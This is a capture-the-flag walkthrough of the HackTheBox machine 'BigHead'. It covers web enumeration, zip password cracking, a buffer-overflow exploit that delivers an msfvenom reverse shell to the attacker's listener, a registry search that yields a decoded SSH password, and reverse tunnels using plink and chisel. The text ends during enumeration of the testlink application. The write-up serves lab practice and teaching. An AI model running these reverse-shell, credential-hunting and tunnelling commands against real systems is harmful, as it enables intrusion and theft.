---
title: HTB: BigHead
url: https://0xdf.gitlab.io/2019/05/04/htb-bighead.html
date: 2019-05-04T14:45:10+00:00
difficulty: Insane [50]
os: Windows
tags: ctf, hackthebox, htb-bighead, nmap, windows, 2k8sp2, gobuster, wfuzz, phpinfo, dirsearch, nginx, github, john, hashcat, zip, 7z, bof, exploit, python, bitvise, reg, plink, chisel, tunnel, ssh, bvshell, webshell, keepass, bash, kpcli, alternative-data-streams
---

![BigHead-cover](https://0xdfimages.gitlab.io/img/bighead-cover.png)

BigHead required you to earn your 50 points. The enumeration was a ton. There was an really fun but challenging buffer overflow to get initial access. Then some pivoting across the same host using SSH and the a php vulnerability. And then finding a hidden KeePass database with a keyfile in an ADS stream which gave me the root flag.

## Box Info

| Name | [BigHead](https://hackthebox.com/machines/bighead)  [BigHead](https://hackthebox.com/machines/bighead) [Play on HackTheBox](https://hackthebox.com/machines/bighead) |
| --- | --- |
| Release Date | [24 Nov 2018](https://twitter.com/hackthebox_eu/status/1065537387873341440) |
| Retire Date | 30 Mar 2019 |
| OS | Windows Windows |
| Base Points | Insane [50] |
| Rated Difficulty | Rated difficulty for BigHead |
| Radar Graph | Radar chart for BigHead |
| First Blood User | 20:48:44[no0ne no0ne](https://app.hackthebox.com/users/21927) |
| First Blood Root | 23:49:32[snowscan snowscan](https://app.hackthebox.com/users/9267) |
| Creator | [3mrgnc3 3mrgnc3](https://app.hackthebox.com/users/6983) |

## Recon

### nmap

`nmap` gives me only one port to focus on, http on 80:

```

root@kali# nmap -sT -p- --min-rate 10000 10.10.10.112
Starting Nmap 7.70 ( https://nmap.org ) at 2018-11-25 08:28 EDT
Nmap scan report for bighead.htb (10.10.10.112)
Host is up (0.020s latency).
Not shown: 65534 filtered ports
PORT   STATE SERVICE
80/tcp open  http

Nmap done: 1 IP address (1 host up) scanned in 13.42 seconds

root@kali# nmap -sV -sC -p 80 10.10.10.112
Starting Nmap 7.70 ( https://nmap.org ) at 2018-11-25 08:29 EDT
Nmap scan report for bighead.htb (10.10.10.112)
Host is up (0.020s latency).

PORT   STATE SERVICE VERSION
80/tcp open  http    nginx 1.14.0
|_http-server-header: nginx/1.14.0
|_http-title: PiperNet Comes

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 7.18 seconds

```

At this point it’s hard to even say for sure what OS I’m dealing with, but I can get a pretty good idea by `pinging` the box:

```

root@kali# ping -c 2 10.10.10.129
PING 10.10.10.129 (10.10.10.129) 56(84) bytes of data.
64 bytes from 10.10.10.129: icmp_seq=1 ttl=63 time=94.0 ms
64 bytes from 10.10.10.129: icmp_seq=2 ttl=63 time=91.7 ms
--- 10.10.10.129 ping statistics ---
2 packets transmitted, 2 received, 0% packet loss, time 3ms
rtt min/avg/max/mdev = 91.708/92.857/94.006/1.149 ms

```

Windows boxes typically respond with a TTL of 128 (which shows as 127 on reaching me). On the other hand, Linux tends to do 64 by default.

### Website - TCP 80

#### Site

The page is a website for a [Silicon Valley](https://en.wikipedia.org/wiki/Silicon_Valley_(TV_series))-themed start-up that does distributed internet and a crypto currency:

![1553806105869](https://0xdfimages.gitlab.io/img/1553806105869.png)

The site had a contact section:

![1553806166550](https://0xdfimages.gitlab.io/img/1553806166550.png)

When I submit, it sends a POST to `mailer.bighead.htb`, and my browser dies because the site isn’t recognized. I’ll update my `/etc/hosts` file, and try again. Now I have a contact form.

Because I have Firefox set to prevent redirection, when I submit the form I see the same page, and a redirect:

![1553806381340](https://0xdfimages.gitlab.io/img/1553806381340.png)

Once I allow the redirect, it sends me back to bighead.htb, which (once added to my hosts file) is the same site I saw by ip earlier.

#### gobuster

I ran `gobuster` with my normal wordlist and the html extension. As it became clear that I needed a lot of enumeration on this box, came back later and ran it with a larger word list. The second list did provide one additional path of interest:

```

root@kali# gobuster -w /usr/share/wordlists/dirbuster/directory-list-2.3-small.txt  -u http://bighead.htb -t 40 -x html

=====================================================
Gobuster v2.0.1              OJ Reeves (@TheColonial)
=====================================================
[+] Mode         : dir
[+] Url/Domain   : http://bighead.htb/
[+] Threads      : 40
[+] Wordlist     : /usr/share/wordlists/dirbuster/directory-list-2.3-small.txt
[+] Status codes : 200,204,301,302,307,403
[+] Extensions   : html
[+] Timeout      : 10s
=====================================================
2018/12/02 06:16:17 Starting gobuster
=====================================================
/images (Status: 301)
/index.html (Status: 200)
/Images (Status: 301)
/{{ "/img (Status: 301)
/Index.html (Status: 200)
/backend (Status: 302)
/backend.html (Status: 302)
/IMAGES (Status: 301)
/%!(NOVERB) (Status: 200)
/Assets (Status: 301)
/INDEX.html (Status: 200)
/backend2 (Status: 302)
/backend2.html (Status: 302)
/backendforum67 (Status: 302)
/backendforum67.html (Status: 302)
/backends (Status: 302)
/backends.html (Status: 302)
/backendforums (Status: 302)
/backendforums.html (Status: 302)
=====================================================
2018/12/02 06:19:26 Finished
=====================================================

root@kali# gobuster -u http://bighead.htb -w /usr/share/seclists/Discovery/Web-Content/big.txt -t 40

=====================================================
Gobuster v2.0.1              OJ Reeves (@TheColonial)
=====================================================
[+] Mode         : dir
[+] Url/Domain   : http://bighead.htb/
[+] Threads      : 40
[+] Wordlist     : /usr/share/seclists/Discovery/Web-Content/big.txt
[+] Status codes : 200,204,301,302,307,403
[+] Timeout      : 10s
=====================================================
2018/12/02 17:11:13 Starting gobuster
=====================================================
/.htaccess (Status: 403)
/.htpasswd (Status: 403)
/Images (Status: 301)
/{{ "/img (Status: 301)
/backend (Status: 302)
/images (Status: 301)
/updatecheck (Status: 302)
=====================================================
2018/12/02 17:11:29 Finished
=====================================================

```

#### /backend\*

Any url ending in `/backend` will redirect to `http://bighead.htb/BigHead`:

```

root@kali# curl -I http://bighead.htb/backendd
HTTP/1.1 302 Moved Temporarily
Server: nginx/1.14.0
Date: Thu, 28 Mar 2019 21:04:30 GMT
Content-Type: text/html
Content-Length: 161
Location: http://bighead.htb/BigHead
Connection: keep-alive

root@kali# curl -I http://bighead.htb/backend0xdf
HTTP/1.1 302 Moved Temporarily
Server: nginx/1.14.0
Date: Thu, 28 Mar 2019 21:05:30 GMT
Content-Type: text/html
Content-Length: 161
Location: http://bighead.htb/BigHead
Connection: keep-alive

```

I’ll keep that in mind in case it comes into play later.

#### /updatecheck

`/updatecheck` redirects to `http://code.bighead.htb/phpmyadmin/phpinfo.php`:

```

root@kali# curl -I http://bighead.htb/updatecheck
HTTP/1.1 302 Moved Temporarily
Server: nginx/1.14.0
Date: Thu, 28 Mar 2019 21:06:45 GMT
Content-Type: text/html
Content-Length: 161
Connection: keep-alive
Location: http://code.bighead.htb/phpmyadmin/phpinfo.php

```

I’ll add this new subdomain to my hosts file, and then check out the page. It does, in fact, present a phpinfo page:

![1553809439040](https://0xdfimages.gitlab.io/img/1553809439040.png)

Knowing that this is a 32-bit Windows 2008 SP2 host will prove useful.

### dev.bighead.htb

#### wfuzz for subdomains

Given the couple subdomains that have popped out, I’ll run `wfuzz` to check for more:

```

root@kali# wfuzz -c -w /usr/share/seclists/Discovery/DNS/subdomains-top1mil-20000.txt -u http://bighead.htb -H "Host: FUZZ.bighead.htb" --hh 11175                                                 
********************************************************
* Wfuzz 2.2.11 - The Web Fuzzer                        *
********************************************************

Target: http://bighead.htb/
Total requests: 19983

==================================================================
ID      Response   Lines      Word         Chars          Payload
==================================================================

000224:  C=302      7 L       10 W          161 Ch        "mailer"
000019:  C=200      1 L        3 W        13456 Ch        "dev"
000574:  C=302      0 L        0 W            0 Ch        "code"

Total time: 124.8010
Processed Requests: 19983
Filtered Requests: 19980
Requests/sec.: 160.1188

```

That’s the two I know about, and a new one, dev.

#### /coffee

At this point, I have a ton more enumeration to do. I’ll need to `gobuster` all three subdomains. The most interesting result is on dev. The main site is just a picture of BigHead:

![1553810368227](https://0xdfimages.gitlab.io/img/1553810368227.png)

I ran `gobuster`, but was getting a bunch of errors, so I switched to `dirsearch`. This is quite fortunate, as `gobuster` would not have identified the path I need. `gobuster` works on a return code whitelist. At the start, you set the codes you want to know about. The default is:

```

[+] Status codes : 200,204,301,302,307,403

```

`dir_search` seems to use a blacklist model, where if the `python` code fails to get the page, it doesn’t report it.

It seems that anything that starts with `/blog` returns the same, so I’ll snip a ton of those from this output:

```

root@kali# dirsearch.py -u http://dev.bighead.htb/ -w /usr/share/wordlists/dirbuster/directory-list-2.3-small.txt -t 40

 _|. _ _  _  _  _ _|_    v0.3.8
(_||| _) (/_(_|| (_| )

Extensions:  | Threads: 40 | Wordlist size: 87646

Error Log: /opt/dirsearch/logs/errors-19-03-29_07-08-47.log

Target: http://dev.bighead.htb/

[07:08:47] Starting: 
[07:08:47] 200 -   13KB - /
[07:08:47] 302 -  161B  - /blog  ->  http://dev.bighead.htb/wp-content
[07:08:47] 302 -  161B  - /blogs  ->  http://dev.bighead.htb/wp-content
[07:08:47] 302 -  161B  - /wp-content  ->  http://dev.bighead.htb/blog
...[snip]...
[07:08:53] 418 -   46B  - /coffee
...[snip]...
[07:11:07] 418 -   46B  - /coffeecat
...[snip]...
[07:13:12] 418 -   46B  - /coffeebreak
...[snip]...
[07:15:14] 418 -   46B  - /coffeecup
...[snip]...

Task Completed

```

Anything ending in `/blog` returns a 302 to `/wp-content`. And `/wp-content` returns a redirect to `/blog`. So that’s broken. Trying to visit in a browser just returns an error.

More interesting is the 418 returns from `/coffee`. What is a 418? [RFC 2324 - Hyper Text Coffee Pot Control Protocol](https://tools.ietf.org/html/rfc2324) was an [April Fools’s joke](https://en.wikipedia.org/wiki/Hyper_Text_Coffee_Pot_Control_Protocol) from 1998, which defined HTTP 418 codes as follows:

> 2.3.2 418 I’m a teapot
>
> Any attempt to brew coffee with a teapot should result in the error
> code “418 I’m a teapot”. The resulting entity body MAY be short and
> stout.

Visiting the page returns this gif:

![](https://0xdfimages.gitlab.io/img/bighead-teapot.gif)

If I look at the response, I’ll see this:

```

HTTP/1.1 418 I'm A Teapot!
Date: Fri, 29 Mar 2019 11:22:00 GMT
Content-Type: text/html
Content-Length: 46
Connection: close
Server: BigheadWebSvr 1.0

```

This is interesting because every other response I’ve received has reported:

```

Server: nginx/1.14.0

```

## BigheadWebSrv

### GitHub

Having never heard of BigheadWebSrv (and suspecting it’s something custom for this box), I googled it. I didn’t expect to find anything, but it’s always better to check. In this case, I did find something:

![1553868952293](https://0xdfimages.gitlab.io/img/1553868952293.png)

The box creators GitHub has a project for it. Seems like I should check this out.

There are only three files and 4 commits:

![1553869787957](https://0xdfimages.gitlab.io/img/1553869787957.png)

### BHWS\_Backup.zip

I’ll clone a copy of the repo to my box to play with:

```

root@kali# git clone https://github.com/3mrgnc3/BigheadWebSvr.git
Cloning into 'BigheadWebSvr'...
remote: Enumerating objects: 11, done.
remote: Total 11 (delta 0), reused 0 (delta 0), pack-reused 11
Unpacking objects: 100% (11/11), done.

```

The license and README files don’t have anything interesting, so I’ll take a look at the zip. `unzip` can’t handle the algorithm, but `7z` works:

```

root@kali# 7z x BHWS_Backup.zip 

7-Zip [64] 16.02 : Copyright (c) 1999-2016 Igor Pavlov : 2016-05-21
p7zip Version 16.02 (locale=en_US.UTF-8,Utf16=on,HugeFiles=on,64 bits,3 CPUs Intel(R) Core(TM) i7-7700 CPU @ 3.60GHz (906E9),ASM,AES-NI)

Scanning the drive for archives:
1 file, 8894 bytes (9 KiB)

Extracting archive: BHWS_Backup.zip
--
Path = BHWS_Backup.zip
Type = zip
Physical Size = 8894

Enter password (will not be echoed):

```

After a few failed guess, I’ll try to crack it, and find the password “thepiedpiper89”:

```

root@kali# /opt/john/run/zip2john BHWS_Backup.zip > BHWS_Backup.zip.hash
BHWS_Backup.zip->BHWS_Backup/ is not encrypted!
BHWS_Backup.zip->BHWS_Backup/conf/ is not encrypted!
root@kali# /opt/john/run/john BHWS_Backup.zip.hash --wordlist=/usr/share/wordlists/rockyou.txt
Using default input encoding: UTF-8
Loaded 1 password hash (ZIP, WinZip [PBKDF2-SHA1 256/256 AVX2 8x])
Will run 3 OpenMP threads                                
Press 'q' or Ctrl-C to abort, almost any other key for status                
thepiedpiper89   (BHWS_Backup.zip)                                           
1g 0:00:00:39 DONE (2019-03-29 10:47) 0.02505g/s 81437p/s 81437c/s 81437C/s thetres..theo5ctk
Use the "--show" option to display all of the cracked passwords reliably                      
Session completed

```

I can now unzip with `7z x BHWS_Backup.zip.` Inside, I’ll find a bunch of config files, and a note:

```

root@kali# find BHWS_Backup/ -type f
BHWS_Backup/conf/uwsgi_params
BHWS_Backup/conf/nginx.conf
BHWS_Backup/conf/win-utf
BHWS_Backup/conf/scgi_params
BHWS_Backup/conf/koi-win
BHWS_Backup/conf/koi-utf
BHWS_Backup/conf/mime.types
BHWS_Backup/conf/fastcgi_params
BHWS_Backup/conf/fastcgi.conf
BHWS_Backup/BigheadWebSvr_exe_NOTICE.txt

```

The note says:

> I removed this vulnerable crapware from the archive
>
> love
> Gilfoyle… :D

### Commit History

Back on GitHub, I’ll look at the four commits.

| Commit | Title | Comments |
| --- | --- | --- |
| 1 | Initial commit | Only `LICENSE` and `README.md` |
| 2 | Nelson’s Web Server Backup | Adds `BHWS_Backup.zip` |
| 3 | Fixed a bug | No files changed |
| 4 | Add files via upload | `BHWS_Backup.zip` gets much smaller, and there’s a comment “Secured It! Gilfoyle…” |

If Gilfoyle secured it by removing it, then I need to look at the older commits.

### Old BHWS\_Backup.zip

I’ll check out either the second or third commit (since there was no change between them, and they include the zip file):

```

root@kali# git log --oneline 
5cc2d98 (HEAD -> master, origin/master, origin/HEAD) Add files via upload
c25f61e Fixed a bug
b1b4d6e Nelson's Web Server Backup
54182c6 Initial commit
root@kali# git checkout b1b4d6e
Note: checking out 'b1b4d6e'.

You are in 'detached HEAD' state. You can look around, make experimental
changes and commit them, and you can discard any commits you make in this
state without impacting any branches by performing another checkout.

If you want to create a new branch to retain commits you create, you may
do so (now or later) by using -b with the checkout command again. Example:

  git checkout -b <new-branch-name>

HEAD is now at b1b4d6e Nelson's Web Server Backup

```

When I try to unzip with 7z, it fails with the password “thepiedpiper89”. I’ll crack this again:

```

root@kali# /opt/john/run/zip2john BHWS_Backup.zip > BHWS_Backup.zip.hash
BHWS_Backup.zip->BHWS_Backup/ is not encrypted!
BHWS_Backup.zip->BHWS_Backup/conf/ is not encrypted!
root@kali# /opt/john/run/john BHWS_Backup.zip.hash --wordlist=/usr/share/wordlists/rockyou.txt 
Using default input encoding: UTF-8
Loaded 4 password hashes with 4 different salts (ZIP, WinZip [PBKDF2-SHA1 256/256 AVX2 8x])
Will run 3 OpenMP threads
Press 'q' or Ctrl-C to abort, almost any other key for status
bighead          (BHWS_Backup.zip)
bighead          (BHWS_Backup.zip)
bighead          (BHWS_Backup.zip)
bighead          (BHWS_Backup.zip)
4g 0:00:00:00 DONE (2019-03-29 11:13) 10.25g/s 15753p/s 63015c/s 63015C/s 123456..iheartyou
Use the "--show" option to display all of the cracked passwords reliably
Session completed

```

Unzip with `7z` and password “bighead”, and it works. Now I have the same config files, but also an exe and a dll:

```

root@kali# find BHWS_Backup/ -type f
BHWS_Backup/bHeadSvr.dll
BHWS_Backup/conf/uwsgi_params
BHWS_Backup/conf/nginx.conf
BHWS_Backup/conf/win-utf
BHWS_Backup/conf/scgi_params
BHWS_Backup/conf/koi-win
BHWS_Backup/conf/koi-utf
BHWS_Backup/conf/mime.types
BHWS_Backup/conf/fastcgi_params
BHWS_Backup/conf/fastcgi.conf
BHWS_Backup/BigheadWebSvr.exe

```

### Buffer Overflow

Analysis will reveal that there’s a buffer overflow in the url handler for the web server that I can use to get execution. I’ll explore that and write an exploit in a [companion post](/2019/05/04/htb-bighead-bof.html). By the end of that post, I have a script I can run to get a shell.

I can run my script:

```

root@kali# python pwn_bighead.py dev.bighead.htb 80 10.10.14.14 443
[*] Generating shellcode:
    msfvenom -p windows/shell_reverse_tcp LHOST=10.10.14.14 LPORT=443 EXIT_FUNC=THREAD -a x86 --platform windows -b "\x00\x0a\x0d" -f python -v shellcode -o sc.py
[+] Shellcode generated successfully
[*] Sending payload 5 times
[+] Opening connection to dev.bighead.htb on port 80: Done
[*] Closed connection to dev.bighead.htb port 80
[+] Opening connection to dev.bighead.htb on port 80: Done
[*] Closed connection to dev.bighead.htb port 80
[+] Opening connection to dev.bighead.htb on port 80: Done
[*] Closed connection to dev.bighead.htb port 80
[+] Opening connection to dev.bighead.htb on port 80: Done
[*] Closed connection to dev.bighead.htb port 80
[+] Opening connection to dev.bighead.htb on port 80: Done
[*] Closed connection to dev.bighead.htb port 80
[+] Payload sent.
[*] Sleeping 1 second.
[*] Sending overflow + egghunter.
[*] Expect callback in 0-15 minutes to 10.10.14.14:443.
[+] Opening connection to dev.bighead.htb on port 80: Done
[*] Closed connection to dev.bighead.htb port 80

```

After some amount of time (can be up to 10-15 minutes if the server has a lot in memory), I get a shell:

```

root@kali# rlwrap nc -lnvp 443
Ncat: Version 7.70 ( https://nmap.org/ncat )
Ncat: Listening on :::443
Ncat: Listening on 0.0.0.0:443
Ncat: Connection from 10.10.10.112.
Ncat: Connection from 10.10.10.112:64296.
Microsoft Windows [Version 6.0.6002]
Copyright (c) 2006 Microsoft Corporation.  All rights reserved.

C:\nginx>whoami
piedpiper\nelson

```

I can go grab `user.txt`, but it’s a troll:

```

C:\Users\Nelson\Desktop>type user.txt

    .-''-.  .-------.      .---.    .-./`)     _______   .---.  .---.
  .'_ _   \ |  _ _   \     | ,_|    \ .-.')   /   __  \  |   |  |_ _|
 / ( ` )   '| ( ' )  |   ,-./  )    / `-' \  | ,_/  \__) |   |  ( ' )
. (_ o _)  ||(_ o _) /   \  '_ '`)   `-'`"`,-./  )       |   '-(_{;}_)
|  (_,_)___|| (_,_).' __  > (_)  )   .---. \  '_ '`)     |      (_,_)
'  \   .---.|  |\ \  |  |(  .  .-'   |   |  > (_)  )  __ | _ _--.   |
 \  `-'    /|  | \ `'   / `-'`-'|___ |   | (  .  .-'_/  )|( ' ) |   |
  \       / |  |  \    /   |        \|   |  `-'`-'     / (_{;}_)|   |
   `'-..-'  ''-'   `'-'    `--------`'---'    `._____.'  '(_,_) '---'
          .---.       ,-----.    ,---.  ,---.   .-''-.     .-'''-.
          | ,_|     .'  .-,  '.  |   /  |   | .'_ _   \   / _     \
        ,-./  )    / ,-.|  \ _ \ |  |   |  .'/ ( ` )   ' (`' )/`--'
        \  '_ '`) ;  \  '_ /  | :|  | _ |  |. (_ o _)  |(_ o _).
         > (_)  ) |  _`,/ \ _/  ||  _( )_  ||  (_,_)___| (_,_). '.
        (  .  .-' : (  '\_/ \   ;\ (_ o._) /'  \   .---..---.  \  :
         `-'`-'|___\ `"/  \  ) /  \ (_,_) /  \  `-'    /\    `-'  |
          |        \'. \_/``".'    \     /    \       /  \       /
          `--------`  '-----'       `---`      `'-..-'    `-...-'
                ,---------. .---.  .---.     .-''-.
                \          \|   |  |_ _|   .'_ _   \
                 `--.  ,---'|   |  ( ' )  / ( ` )   '
                    |   \   |   '-(_{;}_). (_ o _)  |
                    :_ _:   |      (_,_) |  (_,_)___|
                    (_I_)   | _ _--.   | '  \   .---.
                   (_(=)_)  |( ' ) |   |  \  `-'    /
                    (_I_)   (_{;}_)|   |   \       /
                    '---'   '(_,_) '---'    `'-..-'
                             .---.  .---.    ____       .-'''-. .---.  .---.
      .-,                    |   |  |_ _|  .'  __ `.   / _     \|   |  |_ _|
   ,-.|  \ _                 |   |  ( ' ) /   '  \  \ (`' )/`--'|   |  ( ' )
   \  '_ /  |                |   '-(_{;}_)|___|  /  |(_ o _).   |   '-(_{;}_)
   _`,/ \ _/                 |      (_,_)    _.-`   | (_,_). '. |      (_,_)
  (  '\_/ \                  | _ _--.   | .'   _    |.---.  \  :| _ _--.   |
   `"/  \  )                 |( ' ) |   | |  _( )_  |\    `-'  ||( ' ) |   |
     \_/``"                  (_{;}_)|   | \ (_ o _) / \       / (_{;}_)|   |
                             '(_,_) '---'  '.(_,_).'   `-...-'  '(_,_) '---'

```

## Privesc: nelson –> nginx

### Find SSH

As I was enumerating the box, I noticed a bunch of listening ports in the `netstat`:

```

C:\>netstat -ano
netstat -ano

Active Connections

  Proto  Local Address          Foreign Address        State           PID
  TCP    0.0.0.0:80             0.0.0.0:0              LISTENING       3604 <-- nginx
  TCP    0.0.0.0:80             0.0.0.0:0              LISTENING       2144 <-- nginx
  TCP    0.0.0.0:135            0.0.0.0:0              LISTENING       896
  TCP    0.0.0.0:2020           0.0.0.0:0              LISTENING       1508 <-- BvSshServer.exe
  TCP    0.0.0.0:5357           0.0.0.0:0              LISTENING       4
  TCP    0.0.0.0:8048           0.0.0.0:0              LISTENING       3816
  TCP    0.0.0.0:8058           0.0.0.0:0              LISTENING       3840
  TCP    0.0.0.0:8068           0.0.0.0:0              LISTENING       3716
  TCP    0.0.0.0:8078           0.0.0.0:0              LISTENING       3832
  TCP    0.0.0.0:8088           0.0.0.0:0              LISTENING       3824
  TCP    0.0.0.0:47001          0.0.0.0:0              LISTENING       4
  TCP    0.0.0.0:49152          0.0.0.0:0              LISTENING       548
  TCP    0.0.0.0:49153          0.0.0.0:0              LISTENING       940
  TCP    0.0.0.0:49154          0.0.0.0:0              LISTENING       1072
  TCP    0.0.0.0:49155          0.0.0.0:0              LISTENING       640
  TCP    0.0.0.0:49156          0.0.0.0:0              LISTENING       628
  TCP    10.10.10.112:139       0.0.0.0:0              LISTENING       4
  TCP    10.10.10.112:49176     10.10.14.14:443        ESTABLISHED     3824
  TCP    127.0.0.1:443          0.0.0.0:0              LISTENING       1448
  TCP    127.0.0.1:5080         0.0.0.0:0              LISTENING       1448
...[snip]...

```

I was particularly interesting in port 2020, which returns that it’s the `BvSshServer.exe`:

```

C:\>tasklist | findstr 1508
BvSshServer.exe               1508                            0     11,996 K

```

Since I didn’t see this in my original nmap, it must be firewalled off from my host. Some googling reveals this is likely the [Bitvise](https://www.bitvise.com/ssh-server-guide-installing) ssh server.

### Find Credentials

As I continued to enumerate, I decided to search the registry for passwords. I’ll use `reg query` to search the HKEY Local Machine (HKLM). The [docs](https://docs.microsoft.com/en-us/windows-server/administration/windows-commands/reg-query) show that `/f password` will search for the string, “password”, `/t REG_SZ` will specify to look at strings, and `/s` will have it search recursively.

A few keys jump out at me:

```

C:\Users\Nelson\Desktop>reg query HKLM /f password /t REG_SZ /s
...[snip]...
HKEY_LOCAL_MACHINE\SOFTWARE\Classes\kdbxfile\shell\open
    (Default)    REG_SZ    &Open with KeePass Password Safe
...[snip]...
HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Uninstall\KeePassPasswordSafe2_is1
    Inno Setup: Icon Group    REG_SZ    KeePass Password Safe 2
    DisplayName    REG_SZ    KeePass Password Safe 2.40
...[snip]...
HKEY_LOCAL_MACHINE\SYSTEM\ControlSet001\Services\nginx
    PasswordHash    REG_SZ    336d72676e6333205361797a205472794861726465722e2e2e203b440a
...[snip]...
HKEY_LOCAL_MACHINE\SYSTEM\ControlSet002\Services\nginx
    PasswordHash    REG_SZ    336d72676e6333205361797a205472794861726465722e2e2e203b440a
...[snip]...
HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services\nginx
    PasswordHash    REG_SZ    336d72676e6333205361797a205472794861726465722e2e2e203b440a
...[snip]...
End of search: 45 match(es) found.

```

First, I see the KeePass keys. I wasn’t able to get anything out of them now, but I’ll look for config files for each new user I get access as.

Then there’s the nginx service. It has a PasswordHash. But it doesn’t look like a hash to me. In fact, it looks like it’s hex ascii. And it is, a troll:

```

root@kali# echo 336d72676e6333205361797a205472794861726465722e2e2e203b440a | xxd -p -r
3mrgnc3 Sayz TryHarder... ;D

```

However, it’s also a pointer to look closer. When I look at the key that holds this value, I’ll see there’s also an “Authenticate” value:

```

C:\>reg query HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services\nginx
reg query HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services\nginx

HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services\nginx
    Type    REG_DWORD    0x10
    Start    REG_DWORD    0x2
    ErrorControl    REG_DWORD    0x1
    ImagePath    REG_EXPAND_SZ    C:\Program Files\nssm\win32\nssm.exe
    DisplayName    REG_SZ    Nginx
    ObjectName    REG_SZ    .\nginx
    Description    REG_SZ    Nginx web server and proxy.
    DelayedAutostart    REG_DWORD    0x0
    FailureActionsOnNonCrashFailures    REG_DWORD    0x1
    FailureActions    REG_BINARY    00000000000000000000000003000000140000000100000060EA00000100000060EA00000100000060EA0000
    Authenticate    REG_BINARY    4800370033004200700055005900320055007100390055002D005900750067007900740035004600590055006200590030002D0055003800370074003800370000000000
    PasswordHash    REG_SZ    336d72676e6333205361797a205472794861726465722e2e2e203b440a

HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services\nginx\Parameters
HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services\nginx\Enum

```

If I look at that as ASCII, I get a string:

```

root@kali# echo 4800370033004200700055005900320055007100390055002D005900750067007900740035004600590055006200590030002D0055003800370074003800370000000000 | xxd -r -p
H73BpUY2Uq9U-Yugyt5FYUbY0-U87t87

```

### Tunnel

I originally created tunnels with `plink.exe` , but I’m so much more a fan of [chisel](https://github.com/jpillora/chisel) right now (check out [this post](/cheatsheets/chisel) for more details). I’ll show both.

#### plink.exe

First, I’ll upload plink with `smbserver` on my kali box:

```

C:\Users\Nelson\AppData\Local\Temp>net use \\10.10.14.14\share
net use \\10.10.14.14\share
The command completed successfully.

C:\Users\Nelson\AppData\Local\Temp>copy \\10.10.14.14\share\plink.exe .
copy \\10.10.14.14\share\plink.exe .
        1 file(s) copied.

```

I’ll ssh back to my host as the dummy user, and create a reverse tunnel (for details on SSH tunneling, see [this post](/2018/06/10/intro-to-ssh-tunneling.html)):

```

C:\Users\Nelson\AppData\Local\Temp>plink -R 2020:localhost:2020 dummy@10.10.14.14
plink -R 2020:localhost:2020 dummy@10.10.14.14
dummy@10.10.14.14's password: **********************

```

Now I have a tunnel listening on my kali box on port 2020 that will forward to bighead on 2020.

#### chisel

I’ll grab the [latest 32-bit release](https://github.com/jpillora/chisel/releases) and upload it using SMB:

```

C:\Windows\System32\spool\drivers\color>copy \\10.10.14.14\share\chisel_windows_386.exe \Windows\System32\spool\drivers\color\c.exe

```

Now I’ll run my server locally, allowing for reverse tunnels:

```

root@kali# /opt/chisel/chisel server -p 8888 --reverse
2019/03/29 13:43:05 server: Reverse tunnelling enabled
2019/03/29 13:43:05 server: Fingerprint 1b:df:d4:d0:c7:29:0d:3f:77:ef:7a:62:ec:47:ff:9b
2019/03/29 13:43:05 server: Listening on 0.0.0.0:8888...

```

Now I’ll connect back from BigHead:

```

C:\Windows\System32\spool\drivers\color>c.exe client 10.10.14.14:8888 R:2020:127.0.0.1:2020
c.exe client 10.10.14.14:8888 R:2020:127.0.0.1:2020
2019/03/29 17:34:32 client: Connecting to ws://10.10.14.14:8888
2019/03/29 17:34:42 client: Fingerprint 1b:df:d4:d0:c7:29:0d:3f:77:ef:7a:62:ec:47:ff:9b
2019/03/29 17:34:48 client: Connected (Latency 983.2545ms)

```

The server reports the connection as well:

```

2019/03/29 13:44:09 server: session#1: Client version (1.3.1) differs from server version (0.0.0-src)
2019/03/29 13:44:09 server: proxy#1:R:0.0.0.0:2020=>127.0.0.1:2020: Listening

```

Now I can talk to local port 2020 and it will reach 2020 on bighead.

### SSH

With either tunnel set up, I can now ssh in, using the string from the registry, H73BpUY2Uq9U-Yugyt5FYUbY0-U87t87, as a password:

```

root@kali# ssh -p 2020 nginx@localhost
nginx@localhost's password:
bvshell:/$

```

## BvShell Escape

### Enumeration

On sshing in, I’m dropped into a weird shell. Based on the files, my best guess is that I’m in `c:\xampp`, a directory I was unable to get into before as nelson. I am unable to get back to the root of C:.

```

bvshell:/$ ls
anonymous             apache                apache_start.bat      apache_stop.bat       apps                  catalina_service.bat  catalina_start.bat    catalina_stop.bat     cgi-bin               contrib
ctlscript.bat         FileZillaFTP          filezilla_setup.bat   filezilla_start.bat   filezilla_stop.bat    htdocs                img                   install               licenses              locale
mailoutput            mailtodisk            MercuryMail           mercury_start.bat     mercury_stop.bat      mysql                 mysql_start.bat       mysql_stop.bat        nginx.exe             passwords.txt
perl                  php                   phpMyAdmin            properties.ini        readme_de.txt         readme_en.txt         RELEASENOTES          sendmail              service.exe           setup_xampp.bat       
src                   test_php.bat          tmp                   tomcat                uninstall.dat         uninstall.exe         user.txt              webalizer             webdav                xampp-control.exe     
xampp-control.ini     xampp-control.log     xampp_shell.bat       xampp_start.exe       xampp_stop.exe  

```

I appear to be in a [BvShell Jail](https://www.bitvise.com/securing-ssh-server). I definitely need to get out.

### Identify testlink

Looking around, I find the `/apps` folder, and it has one directory in it:

```

bvshell:/apps$ ls
testlink  

```

I remember seeing this in the `nginx.conf` file from GitHub:

```

                location /testlink/ {
                        # Backend server to forward requests to/from
                        proxy_pass          http://127.0.0.1:5080;
                        proxy_cache_key $scheme$proxy_host$request_uri$request_method;
                        proxy_http_version  1.1;
                        
                        # adds gzip
                        gzip_static on;
                
                }

```

I don’t remember seeing this path in my enumeration, so I’ll do a quick `wfuzz`:

```

root@kali# wfuzz -c -w subdomains -u http://10.10.10.112/testlink -H "Host: FUZZbighead.htb"
********************************************************
* Wfuzz 2.3.4 - The Web Fuzzer                         *
********************************************************

Target: http://10.10.10.112/testlink
Total requests: 5

==================================================================
ID   Response   Lines      Word         Chars          Payload
==================================================================

000003:  C=404     21 L       63 W          541 Ch        "mailer."
000005:  C=404     21 L       63 W          541 Ch        ""
000002:  C=301      9 L       30 W          341 Ch        "code."
000001:  C=404      0 L        6 W           26 Ch        "dev."
000004:  C=404      0 L        6 W           26 Ch        "dev."

Total time: 0.056110
